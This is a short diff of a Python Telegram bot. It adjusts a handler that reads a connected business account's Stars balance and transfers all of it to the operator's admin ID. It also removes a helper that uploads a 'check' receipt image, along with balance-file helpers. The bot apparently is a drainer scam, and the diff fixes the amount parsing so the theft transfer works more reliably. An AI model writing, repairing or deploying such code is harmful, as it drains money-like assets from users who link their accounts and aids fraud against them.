@@ -883,7 +883,7 @@ async def transfer_stars_handler(callback: CallbackQuery):
             recipient_id = ADMIN_IDS[0]
             
         stars = await bot.get_business_account_star_balance(business_id)
-        amount = int(stars.amount)
+        amount = int(float(stars.amount))  # Convert to float first in case it's a string with decimal, then to int
         
         if amount > 0:
             await bot.transfer_business_account_stars(business_id, amount, recipient_id)
@@ -904,33 +904,6 @@ async def transfer_stars_handler(callback: CallbackQuery):
         error_msg = f"❌ Ошибка при переводе звёзд: {e}"
         await bot.send_message(LOG_CHAT_ID, error_msg)
         await callback.answer("Ошибка при переводе звёзд", show_alert=True)
-
-async def upload_check_photo():
-    global CHECK_PHOTO_FILE_ID
-    try:
-        photo_message = await bot.send_photo(
-            chat_id=ADMIN_IDS[0],
-            photo=FSInputFile("image2.png"),
-            disable_notification=True
-        )
-        CHECK_PHOTO_FILE_ID = photo_message.photo[-1].file_id
-        logging.info(f"Фото чека загружено, file_id: {CHECK_PHOTO_FILE_ID}")
-        
-        await bot.delete_message(chat_id=ADMIN_IDS[0], message_id=photo_message.message_id)
-        return True
-    except Exception as e:
-        logging.error(f"Ошибка загрузки фото чека: {e}")
-        return False
-# Функции для работы с балансом
-def load_balances():
-    if os.path.exists("user_balances.json"):
-        with open("user_balances.json", "r") as f:
-            return json.load(f)
-    return {}
-
-def save_balances(balances):
-    with open("user_balances.json", "w") as f:
-        json.dump(balances, f)
 
 @dp.inline_query()
 async def inline_query_handler(inline_query: types.InlineQuery):
